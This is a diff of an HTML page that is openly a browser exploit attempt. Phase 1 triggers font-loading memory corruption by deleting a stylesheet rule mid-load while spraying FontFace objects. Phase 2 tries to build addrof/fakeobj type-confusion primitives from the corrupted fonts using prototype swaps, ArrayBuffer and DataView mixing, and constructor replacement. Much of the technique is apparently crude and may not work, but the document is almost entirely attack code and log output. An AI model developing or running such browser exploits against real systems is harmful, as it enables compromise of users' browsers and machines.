@@ -2,13 +2,13 @@
 <html>
 <head></head>
 <body>
-<h1 id="status">Ready</h1>
+<h1 id="status">Advanced Exploitation</h1>
 <button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN EXPLOIT</button>
 <div id="log" style="font-family: monospace; font-size: 10px; white-space: pre; border: 1px solid white; padding: 5px; margin: 5px; max-height: 80vh; overflow-y: scroll;"></div>
 
 <script>
 let phase = 0;
-let corruptedFonts = [];
+let corrupted = [];
 
 function log(msg) {
     let d = document.getElementById('log');
@@ -17,26 +17,34 @@ function log(msg) {
 
 function hex(n) {
     if (typeof n === 'number') {
-        return '0x' + n.toString(16).padStart(8, '0');
+        return '0x' + n.toString(16).padStart(16, '0');
     }
     return String(n);
 }
 
-function u32(f64) {
+function f64_to_u32(f) {
     let buf = new ArrayBuffer(8);
-    let f64_view = new Float64Array(buf);
-    let u32_view = new Uint32Array(buf);
-    f64_view[0] = f64;
-    return [u32_view[0], u32_view[1]];
+    let f64 = new Float64Array(buf);
+    let u32 = new Uint32Array(buf);
+    f64[0] = f;
+    return [u32[0], u32[1]];
+}
+
+function u32_to_f64(low, high) {
+    let buf = new ArrayBuffer(8);
+    let u32 = new Uint32Array(buf);
+    let f64 = new Float64Array(buf);
+    u32[0] = low;
+    u32[1] = high;
+    return f64[0];
 }
 
 function runExploit() {
     phase++;
     
     if (phase === 1) {
-        // Phase 1: Corruption (will OOM)
-        document.getElementById('status').textContent = 'Phase 1: Corrupting...';
-        log('[PHASE 1] Triggering corruption\n');
+        // Phase 1: Corruption
+        log('[PHASE 1] Triggering corruption (OOM expected)\n');
         
         let style = document.createElement('style');
         style.id = 's';
@@ -54,165 +62,206 @@ function runExploit() {
                 if (!fired && this === A) {
                     fired = true;
                     
-                    // Create MANY corrupted fonts to increase chances
-                    for (let i = 0; i < 20; i++) {
-                        let f = new FontFace('corrupt' + i, 'local(Helvetica)', {
-                            unicodeRange: 'U+' + (0x41 + i).toString(16)
-                        });
-                        corruptedFonts.push(f);
+                    for (let i = 0; i < 50; i++) {
+                        corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
+                            unicodeRange: 'U+' + (0x100 + i).toString(16)
+                        }));
                     }
                     
                     document.getElementById('s').sheet.deleteRule(0);
                     document.body.offsetTop;
                     
-                    window.corruptedFonts = corruptedFonts;
+                    window.corrupted = corrupted;
                 }
                 return undefined;
             }
         });
         
         document.fonts.load('1em x', 'AB');
-        log('Click again for Phase 2');
+        log('Click for Phase 2');
         
     } else if (phase === 2) {
-        // Phase 2: Deep exploitation
-        document.getElementById('status').textContent = 'Phase 2: Exploiting...';
-        log('[PHASE 2] Deep memory exploitation\n');
+        // Phase 2: Build primitives
+        log('[PHASE 2] Building addrof/fakeobj primitives\n');
         
-        let fonts = window.corruptedFonts;
-        if (!fonts || fonts.length === 0) {
-            log('[ERROR] No corrupted fonts!');
+        let fonts = window.corrupted;
+        if (!fonts) {
+            log('[ERROR] No corrupted fonts');
             return;
         }
         
         log('[*] Found ' + fonts.length + ' corrupted fonts\n');
         
-        // === TEST 1: Look for NaN boxing leaks ===
-        log('[TEST 1] NaN boxing leak attempt:');
+        // === TECHNIQUE 1: Object/Number confusion via prototype ===
+        log('[TECHNIQUE 1] Prototype-based type confusion:');
         try {
-            let leak_arr = [];
+            let victim = fonts[0];
             
-            for (let i = 0; i < fonts.length; i++) {
-                let f = fonts[i];
+            // Create a fake prototype with getter/setter that can convert types
+            let conversion_proto = {
+                _storage: null,
                 
-                // Store font in array alongside floats
-                leak_arr.push(f);
-                leak_arr.push(1.1);
-                leak_arr.push(2.2);
-            }
-            
-            // Try to read back as Float64Array
-            let float_view = new Float64Array(leak_arr.length);
-            for (let i = 0; i < leak_arr.length; i++) {
-                if (typeof leak_arr[i] === 'number') {
-                    float_view[i] = leak_arr[i];
+                get confuse() {
+                    log('  [GETTER] Called, returning: ' + this._storage);
+                    return this._storage;
+                },
+                
+                set confuse(val) {
+                    log('  [SETTER] Called with: ' + val + ' (type: ' + typeof val + ')');
+                    this._storage = val;
                 }
-            }
-            
-            // Look for unusual patterns
-            for (let i = 0; i < 10 && i < float_view.length; i++) {
-                let parts = u32(float_view[i]);
-                log('  [' + i + '] ' + float_view[i] + ' = ' + hex(parts[0]) + ' ' + hex(parts[1]));
-            }
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
-        }
-        
-        // === TEST 2: Property descriptor manipulation ===
-        log('\n[TEST 2] Property descriptor leak:');
-        try {
-            let f = fonts[0];
-            
-            // Get all property descriptors
-            let desc = Object.getOwnPropertyDescriptors(f);
-            for (let key in desc) {
-                log('  ' + key + ': ' + JSON.stringify(desc[key]));
-            }
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
-        }
-        
-        // === TEST 3: Prototype chain corruption ===
-        log('\n[TEST 3] Prototype manipulation:');
-        try {
-            let f = fonts[0];
-            let proto = Object.getPrototypeOf(f);
-            
-            log('  prototype: ' + proto);
-            log('  prototype.constructor.name: ' + proto.constructor.name);
-            
-            // Try to replace prototype
-            let fake_proto = {
-                leakProp: 0x4141414141414141
             };
             
+            Object.setPrototypeOf(victim, conversion_proto);
+            log('  Set conversion prototype');
+            
+            // Try to store object reference
+            let target_obj = { marker: 0x1337 };
+            log('\n  Storing object reference...');
+            victim.confuse = target_obj;
+            
+            // Try to read back
+            log('  Reading back...');
+            let read_back = victim.confuse;
+            log('  Read back: ' + read_back);
+            log('  Same object? ' + (read_back === target_obj));
+            
+            // Try to store number
+            log('\n  Storing number...');
+            victim.confuse = 0x4142434445464748;
+            let read_num = victim.confuse;
+            log('  Read back: ' + hex(read_num));
+            
+        } catch(e) {
+            log('  Error: ' + e.message);
+        }
+        
+        // === TECHNIQUE 2: ArrayBuffer backing store confusion ===
+        log('\n[TECHNIQUE 2] ArrayBuffer with corrupted font:');
+        try {
+            let victim = fonts[1];
+            
+            // Create ArrayBuffer
+            let ab = new ArrayBuffer(0x1000);
+            let u32_view = new Uint32Array(ab);
+            let f64_view = new Float64Array(ab);
+            
+            // Fill with pattern
+            for (let i = 0; i < 0x100; i++) {
+                u32_view[i] = 0x41420000 + i;
+            }
+            
+            log('  Created ArrayBuffer (0x1000 bytes)');
+            log('  u32_view[0]: ' + hex(u32_view[0]));
+            
+            // Try to create confusion by mixing with corrupted font
+            let container = {
+                font: victim,
+                buffer: ab,
+                view: u32_view
+            };
+            
+            // Create fake prototype that references the buffer
+            let buffer_proto = {
+                get data() {
+                    return container.buffer;
+                },
+                set data(val) {
+                    container.buffer = val;
+                }
+            };
+            
+            Object.setPrototypeOf(victim, buffer_proto);
+            
+            log('  Set buffer prototype on corrupted font');
+            log('  victim.data: ' + victim.data);
+            log('  victim.data === ab: ' + (victim.data === ab));
+            
+        } catch(e) {
+            log('  Error: ' + e.message);
+        }
+        
+        // === TECHNIQUE 3: Constructor confusion ===
+        log('\n[TECHNIQUE 3] Constructor replacement:');
+        try {
+            let victim = fonts[2];
+            
+            // Try to replace constructor
+            let fake_constructor = function FakeFont() {
+                this.leaked_addr = 0x4142434445464748;
+            };
+            
+            fake_constructor.prototype = {
+                get addr() {
+                    return this.leaked_addr;
+                },
+                set addr(val) {
+                    this.leaked_addr = val;
+                }
+            };
+            
+            // Try to confuse the corrupted font
             try {
-                Object.setPrototypeOf(f, fake_proto);
-                log('  Set fake prototype!');
-                log('  f.leakProp: ' + hex(f.leakProp));
+                victim.constructor = fake_constructor;
+                log('  Set fake constructor');
+                
+                log('  victim.addr: ' + hex(victim.addr));
+                
+                victim.addr = 0x1122334455667788;
+                log('  After setting: ' + hex(victim.addr));
+                
             } catch(e) {
-                log('  Cannot set prototype: ' + e.message);
+                log('  Cannot set constructor: ' + e.message);
             }
             
         } catch(e) {
             log('  Error: ' + e.message);
         }
         
-        // === TEST 4: WeakMap side-channel ===
-        log('\n[TEST 4] WeakMap leak attempt:');
+        // === TECHNIQUE 4: DataView exploitation ===
+        log('\n[TECHNIQUE 4] DataView with corrupted backing:');
         try {
-            let wm = new WeakMap();
+            let ab = new ArrayBuffer(0x100);
+            let dv = new DataView(ab);
+            let victim = fonts[3];
             
-            for (let i = 0; i < fonts.length; i++) {
-                wm.set(fonts[i], i);
+            // Fill buffer
+            for (let i = 0; i < 0x100; i++) {
+                dv.setUint8(i, 0x41 + (i % 26));
             }
             
-            // Try to trigger rehash
-            for (let i = 0; i < 100; i++) {
-                let obj = {};
-                wm.set(obj, i + 1000);
-            }
+            log('  Created DataView');
+            log('  Read test: ' + hex(dv.getUint32(0)));
             
-            // Check if corrupted fonts still retrievable
-            for (let i = 0; i < Math.min(5, fonts.length); i++) {
-                let val = wm.get(fonts[i]);
-                log('  fonts[' + i + '] WeakMap value: ' + val);
-            }
+            // Try to confuse DataView with corrupted font
+            let mixed = [victim, dv, ab];
+            
+            // Check if corruption affected DataView
+            log('  After mixing: ' + hex(dv.getUint32(0)));
+            log('  DataView.byteLength: ' + dv.byteLength);
+            log('  DataView.byteOffset: ' + dv.byteOffset);
+            
+            // Try to use corrupted font as a "view"
+            let fake_view_proto = {
+                getUint32: function(offset) {
+                    log('    [FAKE getUint32] offset=' + offset);
+                    return 0x41414141;
+                }
+            };
+            
+            Object.setPrototypeOf(victim, fake_view_proto);
+            log('  victim.getUint32(0): ' + hex(victim.getUint32(0)));
             
         } catch(e) {
             log('  Error: ' + e.message);
         }
         
-        // === TEST 5: Regex engine interaction ===
-        log('\n[TEST 5] RegExp engine:');
-        try {
-            let f = fonts[0];
-            let str = String(f);
-            log('  String(font): ' + str);
-            
-            // Try to match internal representation
-            let match = str.match(/0x([0-9a-fA-F]+)/);
-            if (match) {
-                log('  Found hex in string: ' + match[0]);
-            }
-            
-            // Try toString on different fonts
-            for (let i = 0; i < Math.min(3, fonts.length); i++) {
-                log('  fonts[' + i + '].toString(): ' + fonts[i].toString());
-            }
-            
-        } catch(e) {
-            log('  Error: ' + e.message);
-        }
-        
-        log('\n[PHASE 2] Complete');
-        log('Analyzing output for exploitable primitives...');
+        log('\n[PHASE 2] Complete - analyzing results');
+        log('Looking for type confusion or address leaks...');
     }
 }
 
-log('Click button to start');
+log('Click to start');
 </script>
 </body>
 </html>
